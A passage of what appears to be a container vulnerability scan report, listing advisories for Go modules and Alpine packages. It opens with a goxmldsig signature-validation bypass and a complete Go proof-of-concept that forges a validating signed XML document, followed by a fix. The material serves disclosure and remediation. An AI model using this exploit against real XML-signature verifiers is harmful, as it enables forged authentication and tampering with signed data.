The `validateSignature` function in `validate.go` goes through the references in the `SignedInfo` block to find one that matches the signed element's ID. In Go versions before 1.22, or when `go.mod` uses an older version, there is a loop variable capture issue. The code takes the address of the loop variable `_ref` instead of its value. As a result, if more than one reference matches the ID or if the loop logic is incorrect, the `ref` pointer will always end up pointing to the last element in the `SignedInfo.References` slice after the loop.

------

### Technical Details

The code takes the address of a loop iteration variable (&_ref). In the standard Go compiler, this variable is only allocated once for the whole loop, so its address stays the same, but its value changes with each iteration.

As a result, any pointer to this variable will always point to the value of the *last* element processed by the loop, no matter which element matched the search criteria.

Using Radare2, I found that the assembly at 0x1001c5908 (the start of the loop) loads the iteration values but does not create a new allocation (runtime.newobject) for the variable _ref inside the loop. The address &_ref stays the same during the loop (due to stack or heap slot reuse), which confirms the pointer aliasing issue.

```````go
// goxmldsig/validate.go (Lines 309-313)	
for _, _ref := range signedInfo.References {
		if _ref.URI == "" || _ref.URI[1:] == idAttr {
			ref = &_ref // <- Capture var address of loop
		}
	}

```````

-----

### PoC

The PoC generates a signed document containing two elements and confirms that altering the first element to match the second produces a valid signature.

``````go
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"math/big"
	"time"

	"github.com/beevik/etree"
	dsig "github.com/russellhaering/goxmldsig"
)

func main() {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		NotBefore:    time.Now().Add(-1 * time.Hour),
		NotAfter:     time.Now().Add(1 * time.Hour),
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}

	cert, _ := x509.ParseCertificate(certDER)

	doc := etree.NewDocument()
	root := doc.CreateElement("Root")
	root.CreateAttr("ID", "target")
	root.SetText("Malicious Content")

	tlsCert := tls.Certificate{
		Certificate: [][]byte{cert.Raw},
		PrivateKey:  key,
	}

	ks := dsig.TLSCertKeyStore(tlsCert)
	signingCtx := dsig.NewDefaultSigningContext(ks)

	sig, err := signingCtx.ConstructSignature(root, true)
	if err != nil {
		panic(err)
	}

	signedInfo := sig.FindElement("./SignedInfo")

	existingRef := signedInfo.FindElement("./Reference")
	existingRef.CreateAttr("URI", "#dummy")

	originalEl := etree.NewElement("Root")
	originalEl.CreateAttr("ID", "target")
	originalEl.SetText("Original Content")

	sig1, _ := signingCtx.ConstructSignature(originalEl, true)
	ref1 := sig1.FindElement("./SignedInfo/Reference").Copy()

	signedInfo.InsertChildAt(existingRef.Index(), ref1)

	c14n := signingCtx.Canonicalizer

	detachedSI := signedInfo.Copy()
	if detachedSI.SelectAttr("xmlns:"+dsig.DefaultPrefix) == nil {
		detachedSI.CreateAttr("xmlns:"+dsig.DefaultPrefix, dsig.Namespace)
	}

	canonicalBytes, err := c14n.Canonicalize(detachedSI)
	if err != nil {
		fmt.Println("c14n error:", err)
		return
	}

	hash := signingCtx.Hash.New()
	hash.Write(canonicalBytes)
	digest := hash.Sum(nil)

	rawSig, err := rsa.SignPKCS1v15(rand.Reader, key, signingCtx.Hash, digest)
	if err != nil {
		panic(err)
	}

	sigVal := sig.FindElement("./SignatureValue")
	sigVal.SetText(base64.StdEncoding.EncodeToString(rawSig))

	certStore := &dsig.MemoryX509CertificateStore{
		Roots: []*x509.Certificate{cert},
	}
	valCtx := dsig.NewDefaultValidationContext(certStore)

	root.AddChild(sig)

	doc.SetRoot(root)
	str, _ := doc.WriteToString()
	fmt.Println("XML:")
	fmt.Println(str)

	validated, err := valCtx.Validate(root)
	if err != nil {
		fmt.Println("validation failed:", err)
	} else {
		fmt.Println("validation ok")
		fmt.Println("validated text:", validated.Text())
	}
}
``````

-----

### Impact

This vulnerability lets an attacker get around integrity checks for certain signed elements by replacing their content with the content from another element that is also referenced in the same signature.

------

### Remediation

Update the loop to capture the value correctly or use the index to reference the slice directly.

``````go
// goxmldsig/validate.go	
func (ctx *ValidationContext) validateSignature(el *etree.Element, sig *types.Signature) error {
	var ref *types.Reference

  // OLD
	// for _, _ref := range signedInfo.References {
	// 	if _ref.URI == "" || _ref.URI[1:] == idAttr {
	// 		ref = &_ref
	// 	}
	// }
	
  // FIX
	for i := range signedInfo.References {
		if signedInfo.References[i].URI == "" ||
			signedInfo.References[i].URI[1:] == idAttr {
			ref = &signedInfo.References[i]
			break
		}
	}

	// ...
}
``````

----

### References

https://cwe.mitre.org/data/definitions/347.html

https://cwe.mitre.org/data/definitions/682.html

https://github.com/russellhaering/goxmldsig/blob/main/validate.go

-----

**Author**: Tomas Illuminati

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>github.com/go-git/go-git/v5</strong> <code>5.16.0</code> (golang)</summary>

<small><code>pkg:golang/github.com/go-git/go-git/v5@5.16.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-34165?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3E%3D5.0.0%2C%3C%3D5.17.0"><img alt="medium 5.0: CVE--2026--34165" src="https://img.shields.io/badge/CVE--2026--34165-lightgrey?label=medium%205.0&labelColor=fbb552"/></a> <i>Integer Underflow (Wrap or Wraparound)</i>

<table>
<tr><td>Affected range</td><td><code>>=5.0.0<br/><=5.17.0</code></td></tr>
<tr><td>Fixed version</td><td><code>5.17.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

A vulnerability has been identified in which a maliciously crafted `.idx` file can cause asymmetric memory consumption, potentially exhausting available memory and resulting in a Denial of Service (DoS) condition.

Exploitation requires write access to the local repository's `.git` directory, it order to create or alter existing `.idx` files. 

### Patches

Users should upgrade to `v5.17.1`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.

### Credit

The go-git maintainers thank @<!-- -->kq5y for finding and reporting this issue privately to the `go-git` project.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25934?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C%3D5.16.4"><img alt="medium 4.3: CVE--2026--25934" src="https://img.shields.io/badge/CVE--2026--25934-lightgrey?label=medium%204.3&labelColor=fbb552"/></a> <i>Improper Validation of Integrity Check Value</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=5.16.4</code></td></tr>
<tr><td>Fixed version</td><td><code>5.16.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact 

A vulnerability was discovered in `go-git` whereby data integrity values for `.pack` and `.idx` files were not properly verified. This resulted in `go-git` potentially consuming corrupted files, which would likely result in unexpected errors such as `object not found`.

For context, clients fetch [`packfiles`](https://git-scm.com/docs/pack-protocol#_packfile_data) from upstream Git servers. Those files contain a checksum of their contents, so that clients can perform integrity checks before consuming it. The pack indexes (`.idx`) are [generated](https://git-scm.com/docs/pack-format) locally by `go-git`, or the `git` cli, when new `.pack` files are received and processed. The integrity checks for both files were not being verified correctly.

Note that the lack of verification of the packfile checksum has no impact on the trust relationship between the client and server, which is enforced based on the protocol being used (e.g. TLS in the case of `https://` or known hosts for `ssh://`). In other words, the packfile checksum verification does not provide any security benefits when connecting to a malicious or compromised Git server.

### Patches

Users should upgrade to `v5.16.5`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.

### Workarounds

In case updating to a fixed version of `go-git` is not possible, users can run [git fsck](https://git-scm.com/docs/git-fsck) from the `git` cli to check for data corruption on a given repository. 

### Credit

Thanks @<!-- -->N0zoM1z0 for finding and reporting this issue privately to the `go-git` project.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33762?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C%3D5.17.0"><img alt="low 2.8: CVE--2026--33762" src="https://img.shields.io/badge/CVE--2026--33762-lightgrey?label=low%202.8&labelColor=fce1a9"/></a> <i>Improper Validation of Array Index</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=5.17.0</code></td></tr>
<tr><td>Fixed version</td><td><code>5.17.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

`go-git`’s index decoder for format version 4 fails to validate the path name prefix length before applying it to the previously decoded path name. A maliciously crafted index file can trigger an out-of-bounds slice operation, resulting in a runtime panic during normal index parsing.

This issue only affects Git index format version 4. Earlier formats (`go-git` supports only `v2` and `v3`) are not vulnerable to this issue.

An attacker able to supply a crafted `.git/index` file can cause applications using go-git to panic while reading the index. If the application does not recover from panics, this results in process termination, leading to a denial-of-service (DoS) condition.

Exploitation requires the ability to modify or inject a Git index file within the local repository in disk. This typically implies write access to the `.git` directory.

### Patches

Users should upgrade to `v5.17.1`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.

### Credit

go-git maintainers thank @<!-- -->kq5y for finding and reporting this issue privately to the `go-git` project.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/net</strong> <code>0.40.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/net@0.40.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-58190?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.45.0"><img alt="medium : CVE--2025--58190" src="https://img.shields.io/badge/CVE--2025--58190-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.45.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.45.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The html.Parse function in golang.org/x/net/html has an infinite parsing loop when processing certain inputs, which can lead to denial of service (DoS) if an attacker provides specially crafted HTML content.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47911?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.45.0"><img alt="medium : CVE--2025--47911" src="https://img.shields.io/badge/CVE--2025--47911-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.45.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.45.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The html.Parse function in golang.org/x/net/html has quadratic parsing complexity when processing certain inputs, which can lead to denial of service (DoS) if an attacker provides specially crafted HTML content.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>busybox</strong> <code>1.37.0-r12</code> (apk)</summary>

<small><code>pkg:apk/alpine/busybox@1.37.0-r12?os_name=alpine&os_version=3.21</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-60876?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C%3D1.37.0-r13"><img alt="medium : CVE--2025--60876" src="https://img.shields.io/badge/CVE--2025--60876-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;=1.37.0-r13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-46394?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C1.37.0-r14"><img alt="low : CVE--2025--46394" src="https://img.shields.io/badge/CVE--2025--46394-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.37.0-r14</code></td></tr>
<tr><td>Fixed version</td><td><code>1.37.0-r14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.083%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-58251?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C1.37.0-r14"><img alt="low : CVE--2024--58251" src="https://img.shields.io/badge/CVE--2024--58251-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.37.0-r14</code></td></tr>
<tr><td>Fixed version</td><td><code>1.37.0-r14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.077%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>zlib</strong> <code>1.3.1-r2</code> (apk)</summary>

<small><code>pkg:apk/alpine/zlib@1.3.1-r2?os_name=alpine&os_version=3.21</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22184?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C1.3.2-r0"><img alt="medium : CVE--2026--22184" src="https://img.shields.io/badge/CVE--2026--22184-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.3.2-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.3.2-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27171?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C1.3.2-r0"><img alt="low : CVE--2026--27171" src="https://img.shields.io/badge/CVE--2026--27171-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.3.2-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.3.2-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>github.com/aws/aws-sdk-go</strong> <code>1.55.7</code> (golang)</summary>

<small><code>pkg:golang/github.com/aws/aws-sdk-go@1.55.7</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2020-8911?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"><img alt="medium : CVE--2020--8911" src="https://img.shields.io/badge/CVE--2020--8911-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.203%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A padding oracle vulnerability exists in the AWS S3 Crypto SDK for GoLang versions prior to V2. The SDK allows users to encrypt files with AES-CBC without computing a Message Authentication Code (MAC), which then allows an attacker who has write access to the target's S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file, they can reconstruct the plaintext with (on average) 128*length (plaintext) queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors. It is recommended to update your SDK to V2 or later, and re-encrypt your files.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-8912?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"><img alt="low : CVE--2020--8912" src="https://img.shields.io/badge/CVE--2020--8912-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.141%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the in-band key negotiation exists in the AWS S3 Crypto SDK for GoLang versions prior to V2. An attacker with write access to the targeted bucket can change the encryption algorithm of an object in the bucket, which can then allow them to change AES-GCM to AES-CTR. Using this in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation. It is recommended to update your SDK to V2 or later, and re-encrypt your files.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/aws/aws-sdk-go-v2/service/s3</strong> <code>1.79.4</code> (golang)</summary>

<small><code>pkg:golang/github.com/aws/aws-sdk-go-v2/service/s3@1.79.4</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-xmrv-pmrh-hhx2?s=github&n=s3&ns=github.com%2Faws%2Faws-sdk-go-v2%2Fservice&t=golang&vr=%3C1.97.3"><img alt="medium 5.9: GHSA--xmrv--pmrh--hhx2" src="https://img.shields.io/badge/GHSA--xmrv--pmrh--hhx2-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.97.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.97.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**CVSSv3.1 Rating**: [Medium]
**CVSSv3.1 Score**: [5.9]
**CVSSv3.1 Vector String**: [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H]

## Summary and Impact
An issue exists in the the EventStream header decoder in AWS SDK for Go v2 in versions predating [2026-03-23](https://github.com/aws/aws-sdk-go-v2/releases/tag/release-2026-03-23). An actor can send a malformed EventStream response frame containing a crafted header value type byte outside the valid range, which can cause the host process to terminate.

Impacted versions: < [2026-03-23](https://github.com/aws/aws-sdk-go-v2/releases/tag/release-2026-03-23)

## Patches
This issue has been addressed in versions [2026-03-23](https://github.com/aws/aws-sdk-go-v2/releases/tag/release-2026-03-23) and above. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. 

## Workarounds
Not Applicable

## References
If you have any questions or comments about this advisory, we ask that you contact [AWS/Amazon] Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@<!-- -->amazon.com](mailto:aws-security@<!-- -->amazon.com). Please do not create a public GitHub issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/aws/aws-sdk-go-v2/aws/protocol/eventstream</strong> <code>1.6.10</code> (golang)</summary>

<small><code>pkg:golang/github.com/aws/aws-sdk-go-v2/aws/protocol/eventstream@1.6.10</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-xmrv-pmrh-hhx2?s=github&n=eventstream&ns=github.com%2Faws%2Faws-sdk-go-v2%2Faws%2Fprotocol&t=golang&vr=%3C1.7.8"><img alt="medium 5.9: GHSA--xmrv--pmrh--hhx2" src="https://img.shields.io/badge/GHSA--xmrv--pmrh--hhx2-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.7.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.7.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**CVSSv3.1 Rating**: [Medium]
**CVSSv3.1 Score**: [5.9]
**CVSSv3.1 Vector String**: [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H]

## Summary and Impact
An issue exists in the the EventStream header decoder in AWS SDK for Go v2 in versions predating [2026-03-23](https://github.com/aws/aws-sdk-go-v2/releases/tag/release-2026-03-23). An actor can send a malformed EventStream response frame containing a crafted header value type byte outside the valid range, which can cause the host process to terminate.

Impacted versions: < [2026-03-23](https://github.com/aws/aws-sdk-go-v2/releases/tag/release-2026-03-23)

## Patches
This issue has been addressed in versions [2026-03-23](https://github.com/aws/aws-sdk-go-v2/releases/tag/release-2026-03-23) and above. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. 

## Workarounds
Not Applicable

## References
If you have any questions or comments about this advisory, we ask that you contact [AWS/Amazon] Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@<!-- -->amazon.com](mailto:aws-security@<!-- -->amazon.com). Please do not create a public GitHub issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>filippo.io/edwards25519</strong> <code>1.1.0</code> (golang)</summary>

<small><code>pkg:golang/filippo.io/edwards25519@1.1.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-26958?s=github&n=edwards25519&ns=filippo.io&t=golang&vr=%3C1.1.1"><img alt="low 1.7: CVE--2026--26958" src="https://img.shields.io/badge/CVE--2026--26958-lightgrey?label=low%201.7&labelColor=fce1a9"/></a> <i>Improper Initialization</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>1.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:U</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

`(*Point).MultiScalarMult` failed to initialize its receiver.

If the method was called on an initialized point that is not the identity point, MultiScalarMult produced an incorrect result.

If the method was called on an uninitialized point, the behavior was undefined. In particular, if the receiver was the zero value, MultiScalarMult returned an invalid point that compared Equal to every point.

*Note that MultiScalarMult is a rarely used advanced API. For example, if you only depend on `filippo.io/edwards25519` via `github.com/go-sql-driver/mysql`, **you are not affected**. If you were notified of this issue despite not being affected, consider switching to a vulnerability scanner that is more precise and respectful of your attention, like [govulncheck](https://go.dev/doc/tutorial/govulncheck).*

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>github.com/cloudflare/circl</strong> <code>1.6.1</code> (golang)</summary>

<small><code>pkg:golang/github.com/cloudflare/circl@1.6.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-1229?s=github&n=circl&ns=github.com%2Fcloudflare&t=golang&vr=%3C1.6.3"><img alt="low 2.9: CVE--2026--1229" src="https://img.shields.io/badge/CVE--2026--1229-lightgrey?label=low%202.9&labelColor=fce1a9"/></a> <i>Incorrect Calculation</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.6.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:L/E:P/S:N/AU:Y/U:Amber</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The CombinedMult function in the CIRCL ecc/p384 package (secp384r1 curve) produces an incorrect value for specific inputs. The issue is fixed by using complete addition formulas.
ECDH and ECDSA signing relying on this curve are not affected.

The bug was fixed in **[v1.6.3](https://github.com/cloudflare/circl/releases/tag/v1.6.3)**.

</blockquote>
</details>
</details></td></tr>
</table>

